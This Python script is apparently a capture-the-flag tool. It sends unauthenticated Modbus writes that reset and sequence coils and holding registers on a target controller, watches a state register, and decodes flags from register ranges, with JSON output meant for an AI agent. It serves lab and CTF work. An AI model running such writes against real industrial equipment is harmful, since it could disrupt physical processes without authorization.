#!/usr/bin/env python3
"""modbus_sequence_runner.py — State-Gated Sequence Runner v2.0 (AI-Ready)

Upgraded (Apr 2026):
- Configurable --iface (no hardcoded eth1)
- Incrementing transaction IDs (stateful session safe)
- --verify-each: read-back after writes for silent lock detection
- Word-swap decode variant in flag extraction
- State name mapping and configurable trip detection
- Hex→Base64→ASCII decode chain
- Null-byte stripping in decode
"""
import socket
import struct
import time
import argparse
import re
import base64
import binascii
import sys

STATE_NAMES = {
    0: "OFF", 1: "LOCKED", 2: "INITIALIZING",
    3: "PARTIAL", 4: "OPERATIONAL", 5: "UNSTABLE"
}

def _state_name(v: int) -> str:
    return STATE_NAMES.get(v, f"UNKNOWN({v})")

class ModbusClient:
    def __init__(self, ip, port=502, unit=1, timeout=5.0, iface=None):
        self.ip = ip
        self.port = port
        self.unit = unit
        self.timeout = timeout
        self.iface = iface
        self.sock = None
        self._tid = 0

    def _next_tid(self):
        self._tid = (self._tid + 1) & 0xFFFF
        return self._tid

    def connect(self):
        if self.sock:
            self.sock.close()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        if self.iface:
            try:
                self.sock.setsockopt(socket.SOL_SOCKET, 25, (self.iface + '\0').encode())
            except Exception:
                pass
        self.sock.connect((self.ip, self.port))

    def disconnect(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    def _transaction(self, func, start, data_or_count):
        if not self.sock:
            raise RuntimeError("Session disconnected — stateful session broken")
        try:
            tid = self._next_tid()
            if func in [1, 2, 3, 4, 6]:
                req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, func, start, data_or_count)
            elif func == 5:
                val = 0xFF00 if data_or_count else 0x0000
                req = struct.pack('>HHHBBHH', tid, 0, 6, self.unit, func, start, val)
            elif func == 16:
                values = data_or_count
                count = len(values)
                byte_count = count * 2
                length = 7 + byte_count
                req = struct.pack('>HHHBBHHB', tid, 0, length, self.unit, func, start, count, byte_count)
                for val in values:
                    req += struct.pack('>H', val)
            else:
                return None
                
            self.sock.send(req)
            resp = self.sock.recv(1024)
            if func in [1, 2, 3, 4] and len(resp) >= 9:
                return resp[9:9+resp[8]]
            return resp
        except Exception as e:
            print(f"[!] Socket Error: {e}")
            return None

    def read_hr(self, start, count):
        return self._transaction(3, start, count)
        
    def read_coil(self, start, count):
        return self._transaction(1, start, count)
        
    def write_coil(self, start, val):
        return self._transaction(5, start, val)
        
    def write_hr(self, start, val):
        return self._transaction(6, start, val)
        
    def write_hrs_atomic(self, start, values):
        return self._transaction(16, start, values)

    def read_state(self, state_reg):
        data = self.read_hr(state_reg, 1)
        if data and len(data) >= 2:
            return struct.unpack('>H', data[:2])[0]
        return -1


def decode_data(raw_data, regex, word_swap=False):
    """Multi-chain flag decoder with word-swap and null-strip."""
    seen = set()
    matches = []

    def _add(flag, method):
        if flag not in seen:
            seen.add(flag)
            matches.append((flag, method))

    # Prepare byte variants
    raw_stripped = raw_data.replace(b'\x00', b'')
    variants = [(raw_data, "raw"), (raw_stripped, "null_stripped")]

    # Word-swap variant: swap adjacent register-pairs in raw bytes
    if word_swap and len(raw_data) >= 4:
        ws = bytearray()
        i = 0
        while i + 3 < len(raw_data):
            ws.extend(raw_data[i+2:i+4])  # word B first
            ws.extend(raw_data[i:i+2])    # word A second
            i += 4
        if i < len(raw_data):
            ws.extend(raw_data[i:])
        variants.append((bytes(ws), "word_swap"))
        variants.append((bytes(ws).replace(b'\x00', b''), "word_swap_stripped"))

    for blob, variant_name in variants:
        asc = blob.decode(errors='ignore')

        # 1. Direct ASCII match
        for m in re.finditer(regex, asc):
            _add(m.group(0), f"ASCII({variant_name})")

        # 2. Base64 -> Hex -> ASCII Pipeline
        if len(asc) > 10 and re.match(r'^[A-Za-z0-9+/=]+$', asc):
            try:
                padded = asc + "=" * ((4 - len(asc) % 4) % 4)
                decoded = base64.b64decode(padded)

                try:
                    hex_str = decoded.decode()
                    if re.match(r'^[0-9a-fA-F]+$', hex_str):
                        final_ascii = bytes.fromhex(hex_str).decode(errors='ignore')
                        for m in re.finditer(regex, final_ascii):
                            _add(m.group(0), f"B64->HEX->ASCII({variant_name})")
                except Exception:
                    pass

                dec_asc = decoded.decode(errors='ignore')
                for m in re.finditer(regex, dec_asc):
                    _add(m.group(0), f"B64->ASCII({variant_name})")
            except Exception:
                pass

        # 3. Hex -> ASCII
        if len(asc) > 10 and re.match(r'^[0-9a-fA-F]+$', asc):
            try:
                dec_hex = bytes.fromhex(asc).decode(errors='ignore')
                for m in re.finditer(regex, dec_hex):
                    _add(m.group(0), f"HEX->ASCII({variant_name})")
            except Exception:
                pass

        # 4. NEW: Hex -> Base64 -> ASCII (vault pattern)
        hex_candidates = re.findall(r'[0-9a-fA-F]{20,}', asc)
        for hc in hex_candidates:
            if len(hc) % 2 != 0:
                continue
            try:
                step2 = binascii.unhexlify(hc)
                step2_str = step2.decode('ascii', errors='ignore').strip()
                if re.fullmatch(r'[A-Za-z0-9+/=]{8,}', step2_str):
                    padded = step2_str + '=' * (-len(step2_str) % 4)
                    step3 = base64.b64decode(padded)
                    step3_str = step3.decode(errors='ignore')
                    for m in re.finditer(regex, step3_str):
                        _add(m.group(0), f"HEX->B64->ASCII({variant_name})")
            except Exception:
                pass

    return matches

def main():
    parser = argparse.ArgumentParser(description="Modbus State-Gated Sequence Runner (God-Mode)")
    parser.add_argument('--ip', required=True)
    parser.add_argument('--port', type=int, default=502)
    parser.add_argument('--unit', type=int, default=1)
    
    # Gap Fillers
    parser.add_argument('--reset-coils', help="Format: start:end=val (e.g. 0:10=0)")
    parser.add_argument('--reset-hrs', help="Format: start:end=val (e.g. 0:10=0)")
    parser.add_argument('--atomic-write-hr', help="Format: start=val,val,val (e.g. 10=0xDEAD,0xBEEF,0xCAFE,0xF00D)")
    parser.add_argument('--sequence-coils', help="Format: addr=val,addr=val (e.g. 0=1,2=1,1=1,3=1)")
    parser.add_argument('--sequence-hrs', help="Format: addr=val,addr=val (e.g. 1=50,2=50)")
    parser.add_argument('--sequence-delay', type=float, default=0.3, help="Delay between sequence writes")
    parser.add_argument('--state-reg', type=int, default=0, help="HR address of state register for inter-step checks (default: 0)")
    parser.add_argument('--abort-on-state', type=int, default=1, help="Abort sequence if state == this value (default: 1=LOCKED)")
    
    parser.add_argument('--wait-stabilize', type=float, default=0.0, help="Seconds to wait after sequences before reading")
    parser.add_argument('--poll-until', help="Format: type:addr==val (e.g. HR:0==4)")
    parser.add_argument('--poll-timeout', type=int, default=10, help="Seconds to wait for poll-until")
    
    parser.add_argument('--decode-ranges', help="Format: start:count,start:count (e.g. 100:50,200:50)")
    parser.add_argument('--flag-regex', default=r'(?:coc2026|flag|RTAF|f1a9|fl4g|CTF)\{.*?\}')
    parser.add_argument('--verify-each', action='store_true', help='Read-back verify after each write (silent lock detection)')
    parser.add_argument('--word-swap', action='store_true', help='Also decode with word-swapped register pairs')
    parser.add_argument('--iface', default=None, help='Network interface to bind (e.g. eth1)')
    parser.add_argument('--json', action='store_true', help='Machine-readable JSON output for AI')
    
    args = parser.parse_args()
    
    report = {
        "target": f"{args.ip}:{args.port}", "unit": args.unit,
        "phases": {}, "flag": None, "flag_location": None,
        "status": "pending", "error": None,
        "silent_locks": 0,
    }
    if not args.json:
        print("==================================================")
        print(" 🏴‍☠️ MODBUS SEQUENCE RUNNER v2.0 (GOD-MODE) 🏴‍☠️")
        print("==================================================")
    
    client = ModbusClient(args.ip, args.port, args.unit, iface=args.iface)
    try:
        client.connect()
    except Exception as e:
        report["status"] = "connection_failed"
        report["error"] = str(e)
        if args.json: print(__import__('json').dumps(report, indent=2))
        else: print(f"[-] Connect failed: {e}")
        sys.exit(1)
    
    # Step 1: Resets
    if args.reset_coils:
        parts = args.reset_coils.split('=')
        rng = parts[0].split(':')
        val = int(parts[1]) > 0
        start, count_or_end = int(rng[0]), int(rng[1])
        if not args.json: print(f"[*] Resetting Coils {start}..{start+count_or_end-1} = {val}")
        for i in range(start, start + count_or_end):
            client.write_coil(i, val)
            time.sleep(0.05)
        report["phases"]["reset_coils"] = {"start": start, "count": count_or_end, "value": int(val)}
            
    if args.reset_hrs:
        parts = args.reset_hrs.split('=')
        rng = parts[0].split(':')
        val = int(parts[1], 0)
        start, end = int(rng[0]), int(rng[1])
        print(f"[*] Resetting HRs {start} to {end} -> {val}")
        for i in range(start, end):
            client.write_hr(i, val)
            time.sleep(0.05)
            
    # Step 2: Atomic Write (FC16)
    if args.atomic_write_hr:
        parts = args.atomic_write_hr.split('=')
        start = int(parts[0])
        vals_str = parts[1].split(',')
        vals = [int(v, 0) for v in vals_str]
        print(f"[*] Atomic Write (FC16) at HR {start} -> {vals}")
        client.write_hrs_atomic(start, vals)
        time.sleep(args.sequence_delay)
        
    # Step 3: Sequential Writes (State Machine) — with inter-step state verification
    aborted = False
    if args.sequence_coils:
        steps = args.sequence_coils.split(',')
        seq_log = []
        if not args.json: print(f"[*] Executing Coil Sequence ({len(steps)} steps) with state-reg HR[{args.state_reg}]...")
        for i, step in enumerate(steps):
            addr, val = step.split('=')
            addr = int(addr)
            val = int(val) > 0
            client.write_coil(addr, val)
            time.sleep(args.sequence_delay)

            # Verify write if requested
            if args.verify_each:
                vdata = client.read_coil(addr, 1)
                if vdata:
                    actual_bit = (vdata[0] & 1) > 0
                    if actual_bit != val:
                        report["silent_locks"] += 1
                        if not args.json:
                            print(f"    [⚠️ SILENT LOCK] Coil {addr}: wrote {'ON' if val else 'OFF'} but read {'ON' if actual_bit else 'OFF'}")

            state = client.read_state(args.state_reg)
            entry = {"step": i+1, "coil": addr, "value": int(val), "state_after": state, "state_name": _state_name(state)}
            seq_log.append(entry)
            if not args.json: print(f"    [{i+1}] Coil {addr}={'ON' if val else 'OFF'} | state={state} ({_state_name(state)})")
            if state == args.abort_on_state:
                if not args.json: print(f"[!] Aborted — state hit {state} (abort_on_state={args.abort_on_state})")
                report["status"] = "aborted_locked"
                aborted = True
                break
        report["phases"]["sequence_coils"] = {"steps": seq_log, "aborted": aborted}
            
    if args.sequence_hrs:
        steps = args.sequence_hrs.split(',')
        if not args.json: print(f"[*] Executing HR Sequence ({len(steps)} steps)...")
        hr_log = []
        for i, step in enumerate(steps):
            addr, val = step.split('=')
            addr = int(addr)
            val = int(val, 0)
            client.write_hr(addr, val)
            time.sleep(args.sequence_delay)

            # Verify write if requested
            verified = None
            if args.verify_each:
                vdata = client.read_hr(addr, 1)
                if vdata and len(vdata) >= 2:
                    actual = struct.unpack('>H', vdata[:2])[0]
                    verified = actual
                    if actual != (val & 0xFFFF):
                        report["silent_locks"] += 1
                        if not args.json:
                            print(f"    [⚠️ SILENT LOCK] HR {addr}: wrote {val} but read {actual}")

            state = client.read_state(args.state_reg)
            entry = {"step": i+1, "hr": addr, "value": val, "verified": verified, "state_after": state, "state_name": _state_name(state)}
            hr_log.append(entry)
            if not args.json: print(f"    [{i+1}] HR {addr} = {val} | state={state} ({_state_name(state)})")
            if state == args.abort_on_state:
                if not args.json: print(f"[!] Aborted HR seq — state hit {state} ({_state_name(state)})")
                report["status"] = "aborted_locked"
                aborted = True
                break
        report["phases"]["sequence_hrs"] = {"steps": hr_log, "aborted": aborted}
            
    # Step 4: Wait / Poll for Stabilization
    if not aborted and args.wait_stabilize > 0:
        if not args.json: print(f"[*] Waiting {args.wait_stabilize}s for stabilization...")
        time.sleep(args.wait_stabilize)
        report["phases"]["wait_stabilize"] = {"seconds": args.wait_stabilize}
        
    if not aborted and args.poll_until:
        p_type, cond = args.poll_until.split(':')
        p_addr, p_val = cond.split('==')
        p_addr = int(p_addr)
        p_val = int(p_val, 0)
        print(f"[*] Polling {p_type} {p_addr} until == {p_val} (Timeout: {args.poll_timeout}s)...")
        
        start_time = time.time()
        success = False
        while time.time() - start_time < args.poll_timeout:
            data = None
            if p_type.upper() == 'HR':
                data = client.read_hr(p_addr, 1)
            elif p_type.upper() == 'COIL':
                data = client.read_coil(p_addr, 1)
                
            if data:
                val = struct.unpack('>H', data)[0] if p_type.upper() == 'HR' else (data[0] > 0)
                print(f"    -> Current value: {val}")
                if val == p_val:
                    success = True
                    break
            time.sleep(0.5)
            
        if not success:
            print("[-] Poll timeout reached. Proceeding anyway...")
        else:
            print("[+] Condition met! System stabilized.")
            
    # Step 5: Read and Decode Target Ranges
    if not aborted and args.decode_ranges:
        if not args.json: print(f"\n[*] Scanning & Decoding Target Ranges: {args.decode_ranges}")
        ranges = args.decode_ranges.split(',')
        found_flags = []
        for rng in ranges:
            start, count = map(int, rng.split(':'))
            data = client.read_hr(start, count)
            if data:
                flags = decode_data(data, args.flag_regex, word_swap=args.word_swap)
                for f, method in flags:
                    if f not in [x[0] for x in found_flags]:
                        found_flags.append((f, method, f"HR {start}:{count}"))
        report["phases"]["decode"] = {"ranges": args.decode_ranges, "found": len(found_flags)}
        if found_flags:
            first = found_flags[0]
            report["flag"] = first[0]
            report["flag_location"] = first[2]
            report["status"] = "flag_found"
        else:
            if report["status"] == "pending":
                report["status"] = "no_flag_found"

    if report["status"] == "pending":
        report["status"] = "complete"

    client.disconnect()

    import json as _json
    if args.json:
        print(_json.dumps(report, indent=2))
    else:
        print("\n==================================================")
        if report.get("flag"):
            for f, method, loc in found_flags:
                print(f"[FLAG] {f}")
                clean = re.sub(r'^(?:coc2026|flag|RTAF|f1a9|fl4g|CTF)\{', '', f)[:-1]
                print(f"[CLEAN] {clean}")
                print(f"[METHOD] sequence_runner {loc} via {method} decode")
        elif report["status"] == "aborted_locked":
            print(f"[-] Sequence aborted — state hit LOCKED during execution.")
        else:
            print("[-] No flags found in specified ranges.")
        print("==================================================")

if __name__ == "__main__":
    main()
